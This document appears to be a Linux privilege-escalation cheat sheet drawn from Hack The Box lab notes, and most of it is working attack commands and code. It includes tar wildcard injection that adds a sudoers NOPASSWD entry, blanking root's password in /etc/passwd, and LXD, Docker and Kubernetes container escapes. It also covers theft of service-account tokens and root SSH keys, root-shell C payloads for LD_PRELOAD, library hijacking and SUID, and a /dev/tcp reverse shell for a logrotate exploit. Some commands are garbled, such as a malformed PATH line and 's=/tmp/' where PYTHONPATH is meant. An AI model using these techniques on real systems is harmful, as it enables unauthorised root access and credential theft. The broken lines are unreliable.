### Information Gathering

#### Environment Enumeration
#Environment_Enumeration

- Determine the operating system and version :
```sh
cat /etc/os-release
```

- Display the system's PATH variable:
```sh
echo $PATH
```

- Show the environment variables:
```sh
env
```

- Display detailed system information:
```sh
uname -a
```

- Gather information about the CPU type/version:
```sh
lscpu
```

- Identify available login shells :
```sh
cat /etc/shells
bash --version
```

- Enumerate block devices :
```sh
lsblk
```

- Check for credentials in /etc/fstab :
```sh
cat /etc/fstab | grep -E 'password|username|credential'
```

- Grab a hash from id_rsa :
```sh
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlist/rockyou.txt ssh.hash
```

- Display the routing table to view available networks and interfaces:
```sh
netstat -rn
```

- Check  for domain environments and internal DNS configuration:
```sh
cat /etc/resolv.conf
```

- Enumerate users from /etc/passwd:
```sh
cat /etc/passwd | cut -f1 -d:
```

- Display information about groups on the system:
```sh
cat /etc/group
```

- List members of interesting groups, e.g., 'sudo':
```sh
getent group sudo
```

- Display information about mounted file systems:
```sh
df -h
```

- Display details of unmounted file systems from /etc/fstab:
```sh
cat /etc/fstab | grep -v "#" | column -t
```

- List all hidden files :
```sh
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

- List all hidden directories :
```sh
find / -type d -name ".*" -ls 2>/dev/null
```

 - Display information about temporary files and directories:
```sh
ls -l /tmp /var/tmp /dev/shm
```


#### Linux Services & Internals Enumeration
#Linux_Services_Internals_Enumeration

- Last login on the machine:
```sh
lastlog 
```

- Find some credentials : 
```sh
history
```

- Find history file : 
```sh
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
 
- Proc : 
```sh
 find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

- See installed services : 
```sh
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

- Compare existing binaries with the ones from GTFObins:
```sh
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

- Find configuration file on the machine : 

```sh
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
#or 
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

 - Enumerate sh file:
```sh
find / -type f -name "*.sh"
#or
sudo find / -type f -name "*.sh" -user www-data -readable
#or
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

 -  `strace` on Linux-based  : 
```sh
strace ping -c1 10.129.112.20
```

 - Process running : 
```sh
ps aux | grep root
```

#### Credential Hunting
#Linux_Credential

- Wordpress Credential  : 
```sh
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

- Website Credential :
```sh
grep -ir "DB_USER\|DB_PASSWORD" /var/www/html
```

### Environment-based Privilege Escalation
#Path_Abuse

- Path Abuse: 
```sh
PATH =.:${PATH}
export PATH
echo $PATH
#then 
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

- Exemple of another Path Abuse :
https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de

**Wildcard Abuse**
#Wildcard_Abuse

- Example of wildcard abuse : 
```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

echo "" > "--checkpoint-action=exec=sh root.sh"

echo "" > --checkpoint=1
```

- Output: 
```sh
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

- Restricted shell resource :
https://0xffsec.com/handbook/shells/restricted-shells/
### Permissions-based Privilege Escalation

**Special Permissions**
#setgid_setuid

- Find Root setgid and `setuid` : 
```sh
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
#and
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

- Ressources :
https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits

**LXC / LXD Exploitation**
#LXC_LXD

1. **Group Membership:**
   - User `devops` is a member of groups `devops` and `lxd`.
   - Command: 
     ```sh
     id
     ```
   - Output: `uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)`

2. **Unzipping Alpine Image:**
   - Command: 
     ```sh
     unzip alpine.zip
     ```
   - Output: Archive extraction details.

3. **LXD Initialization:**
   - Command: 
     ```sh
     lxd init
     ```
   - Prompts:
     - Configure new storage pool? (yes)
     - Storage backend (dir)
     - LXD over the network? (no)
     - Configure LXD bridge? (yes)

   - Error: `/usr/sbin/dpkg-reconfigure` must be run as root.

4. **Import Local Image:**
   - Command: 
     ```sh
     lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
     ```
   - Output: Image imported with fingerprint `be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b`

5. **Start Privileged Container:**
   - Command: 
     ```sh
     lxc init alpine r00t -c security.privileged=true
     ```
   - Output: Container `r00t` created.

6. **Mount Host File System:**
   - Command: 
     ```sh
     lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
     ```
   - Output: Device `mydev` added to `r00t`.

7. **Spawn Shell Inside Container:**
   - Commands:
 ```sh
lxc start r00t
 ```
       
```sh
lxc exec r00t /bin/sh
```
   - Output: Access inside the container with root privileges.

8. **Docker Group Exploitation:**
   - Members in the docker
   - group have root-level access.
   - Example Docker command: 
```sh
     docker run -v /root:/mnt -it ubuntu
```

9. **Disk Group Access:**
   - Users in the disk group have full access to devices in `/dev`, like `/dev/sda1`.
   - Example: Use `debugfs` to access the entire file system with root privileges.

10. **ADM Group Access:**
    - Members in the adm group can read all logs in `/var/log`.
    - User `secaudit` is a member of groups `secaudit` and `adm`.

**Capabilities**
#Capabilities
 
- Enumerate Capabilities : 

```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

- Exploiting  Capabilities: 
```sh
getcap /usr/bin/vim.basic
```

- We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```sh
/usr/bin/vim.basic /etc/passwd
```

- We also can make these changes in a non-interactive mode:

```sh
echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

 
### Service-based Privilege Escalation

- Writable files or directories:
```sh
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

- Download pspy : 
```sh
wget https://github.com/DominicBreuker/pspy
```

- Run pspy : 
```sh
#print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000
```

**LXD ** 
#LXD2

- Step 1: 
```sh
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```
- Step 2 : 
```sh
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

- Get a root shell : 
```sh
lxc start privesc
lxc exec privesc /bin/bash # or sh for the command 
```

**Docker** 
#Docker

- Create our own docker : 
```sh
wget https://master.dockerproject.org/linux/x86_64/docker
chmod +x docker
	docker -H unix:///app/docker.sock ps
``` 

```sh
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
docker -H unix:///app/docker.sock ps
docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

cat /hostsystem/root/.ssh/id_rsa
```

- Other way to privesc when the socket is writable  :

```sh
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```



- **--privileged` flag`**

The --privileged flag allows the container to have access to the host devices.

Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag --privileged is specified, it is possible to get the privileges to see the host drive.

So to take over the host machine, it is trivial:

```shell
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
- Need to be root to be able to mount .
	**Bonus**: If you want to know the container id it's located in /etc/hostname of the docker container

**Kubernetes**
#Kubernetes
 
- Extracting Pods with anonymous access:
```sh
curl https://10.129.10.11:10250/pods -k | jq .
#or 
kubeletctl -i --server 10.129.10.11 pods
```
- Available command : 
```sh
 kubeletctl -i --server 10.129.10.11 scan rce
 #then get a root access
 kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

- Extracting Tokens : 

```sh
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
- Extracting Certificate : 
```sh
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

- List Privileges
```sh
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
#output

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											    []					[]				[get create list]
```

- Create our own YAML pod : 
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

- Creation new pod : 
```sh
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
#output

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

- Extracting root ssh or make a reverse shell : 
```sh
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

**Logrotate**
#Logrotate

- Download logrotten :
```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

- In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function:
```sh
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

- Exploit: 
```sh
./logrotten -p ./payload /tmp/tmp.log
```

**Weak NFS Privileges :** 

```sh
showmount -e 10.129.2.12
cat /etc/exports

#no_root_squash
```

- shell bit SUID : 
```sh
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```sh
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

- Hijacking Tmux : 

```sh
tmux -S /shareds new -s debugsess
chown root:devs /shareds
tmux -S /shareds
```


### Linux Internals-based Privilege Escalation


**LD_PRELOAD**
#LD_PRELOAD

- Exploit:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

- Compile : 
```sh
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- Run:
```sh
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart #Apache no password root
```

**Shared Object Hijacking**
#Shared_Object_Hijacking

```sh
 readelf -d payroll  | grep PATH
 #payroll file with bit Suid
```

- Custom LIb : 
```sh
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
ldd payroll
```

- Exploit : 
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

- Compile:
```sh
gcc src.c -fPIC -shared -o /development/libshared.so
```

 **Python Library Hijacking**
#Python_Hijacking

```sh
pip3 show psutil #misconfigure lib psutil
```

- Exploit:
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

**PYTHONPATH Environment Variable**

In the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

- Checking sudo permissions

```sh
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

 - Privilege Escalation using PYTHONPATH Environment Variable

```sh
s=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.

- Other way to privesc:
```sh
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```
### Resources

- Tools : 
  **https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh**



